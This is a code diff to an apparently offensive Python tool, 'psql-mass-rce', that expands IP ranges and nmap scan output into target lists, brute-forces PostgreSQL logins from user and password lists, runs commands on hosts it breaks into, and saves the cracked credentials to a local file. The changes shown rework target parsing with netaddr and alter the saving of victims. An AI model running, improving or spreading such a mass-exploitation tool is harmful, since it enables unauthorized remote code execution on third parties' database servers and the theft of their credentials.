@@ -3,7 +3,7 @@
 import argparse
 import psycopg2
 import re
-import ipaddress
+from netaddr import *
 
 class Victim:
     def __init__(self, ip, port, username=None, password=None):
@@ -80,13 +80,10 @@ class Victim:
 
     def save_victim(self):
         # We cannot use r+ because file may not exist before first run. We cannot use w+ because it deletes the file.
-        # So we use a+. But this mode sets initial position at the end, so...
         f = open('.psql-mass-rce.saved', 'a+')
-        last_position = f.tell() # remember last position
         f.seek(0) # goto first position of the file to search if victim is already in the file
         host_port = self.ip + ":" + str(self.port)
         if host_port not in f.read():
-            f.seek(last_position) # goto last position of the file to write new string
             f.write(host_port + ":" + self.username + ":" + self.password + "\n")
         f.close()
 
@@ -143,13 +140,11 @@ def parse_file_gnmap(file_path):
 # Returns [(ip, port)]
 def parse_target(target, port):
     try:
-        ipaddress.ip_address(target)
-        return [(target, port)]  # one IP
-    except ValueError:
+        return map(lambda arg: (str(arg), port), list(IPGlob(target)))  # IP/range to [(host,port)]
+    except:
         try:
-            ipaddress.ip_network(target)
-            return map(lambda arg: (arg, port), ipaddress.ip_network(target).hosts())  # range /24. create [(host,port)]
-        except ValueError:
+            return map(lambda arg: (str(arg), port), list(IPNetwork(target)))  # IP/range to [(host,port)]
+        except:
             try:
                 return parse_file_gnmap(target)  # local gnmap file
             except:
@@ -166,6 +161,8 @@ def attack_victim(ip, port, userlist, passlist, command):
             victim.do_rce(command)
 
 
+# TODO: Move load_session_file and save_session_file to new class State
+# We will read file only once, compare good hosts in memory, and save session when necessary
 def load_save_file():
     try:
         with open('.psql-mass-rce.saved') as f:
